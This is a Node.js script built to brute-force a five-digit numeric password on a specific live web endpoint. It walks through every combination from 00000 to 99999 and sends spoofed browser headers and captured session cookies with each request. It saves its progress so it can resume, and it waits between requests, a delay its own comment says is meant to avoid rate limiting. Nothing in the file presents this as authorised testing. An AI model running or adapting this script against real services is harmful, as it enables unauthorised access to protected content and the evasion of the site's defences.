const axios = require('axios');
const fs = require('fs');
const path = require('path');

// Function to delay execution
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// Parse command line arguments
const args = process.argv.slice(2);
const startNum = args[0] ? parseInt(args[0], 10) : 0;
const endNum = args[1] ? parseInt(args[1], 10) : 99999;

const progressFile = path.join(__dirname, 'progress.json');

// Function to save progress
function saveProgress(currentNum) {
  fs.writeFileSync(progressFile, JSON.stringify({ lastAttempt: currentNum }));
}

// Function to load progress
function loadProgress() {
  if (fs.existsSync(progressFile)) {
    try {
      const data = JSON.parse(fs.readFileSync(progressFile, 'utf8'));
      return data.lastAttempt;
    } catch (err) {
      console.error('Error reading progress file:', err);
    }
  }
  return null;
}

// Check if we should resume from a saved point
let startingPoint = startNum;
const savedProgress = loadProgress();
if (savedProgress !== null && savedProgress > startNum) {
  const shouldResume = process.env.RESUME !== 'false';
  if (shouldResume) {
    console.log(`Resuming from last attempt: ${savedProgress}`);
    startingPoint = savedProgress + 1;
  } else {
    console.log(`Found saved progress (${savedProgress}), but starting from specified point: ${startNum}`);
  }
}

console.log(`Starting brute force from ${startingPoint} to ${endNum}`);

// Function to send request with a specific password
async function tryPassword(password) {
  try {
    const response = await axios({
      method: 'post',
      url: 'https://secret.corgi.insure/api/verify-password',
      headers: {
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://secret.corgi.insure',
        'referer': 'https://secret.corgi.insure/',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'priority': 'u=1, i',
        'cookie': 'AWSALB=/W9H0/DQ3ukcjQDb2e1M60OyPf0Dlq8MhtgRIwDaOOjqdYS9uXjiU+2MqpMOQxEm1M3Woj2X6MzWQ1xYz9y9rB4uiPbzrbofl7111VW+MTbRt/qd0ugKANiPQlQk; AWSALBCORS=/W9H0/DQ3ukcjQDb2e1M60OyPf0Dlq8MhtgRIwDaOOjqdYS9uXjiU+2MqpMOQxEm1M3Woj2X6MzWQ1xYz9y9rB4uiPbzrbofl7111VW+MTbRt/qd0ugKANiPQlQk'
      },
      data: {
        password
      },
      // Setting withCredentials to true to include cookies in the request
      withCredentials: true
    });
    
    console.log(`Tried ${password}: ${response.status}`);
    console.log(response.data);
    
    // If we get a successful response, we might have found the correct password
    if (response.data.success || response.status === 200) {
      console.log(`Success with password: ${password}`);
      return true;
    }
    
    return false;
  } catch (error) {
    console.log(`Error trying ${password}: ${error.message}`);
    return false;
  }
}

// Handle graceful shutdown
process.on('SIGINT', () => {
  console.log('\nProcess interrupted. Progress has been saved.');
  process.exit(0);
});

// Main function to try different password combinations
async function bruteForce() {
  // Try 5-digit combinations from startNum to endNum
  for (let i = startingPoint; i <= endNum; i++) {
    // Format the number to ensure it's 5 digits with leading zeros if needed
    const formattedNumber = i.toString().padStart(5, '0');
    
    console.log(`Trying combination: ${formattedNumber}`);
    const success = await tryPassword(formattedNumber);
    
    // Save progress every 10 attempts
    if (i % 10 === 0) {
      saveProgress(i);
    }
    
    if (success) {
      console.log(`Found working password: ${formattedNumber}`);
      fs.writeFileSync(path.join(__dirname, 'success.txt'), formattedNumber);
      break;
    }
    
    // Add a small delay between requests to avoid rate limiting
    await delay(200);
  }
  
  // Save final progress
  saveProgress(endNum);
}

// Start the brute force process
bruteForce().then(() => {
  console.log('Brute force completed');
}).catch(err => {
  console.error('Error in brute force process:', err);
}); 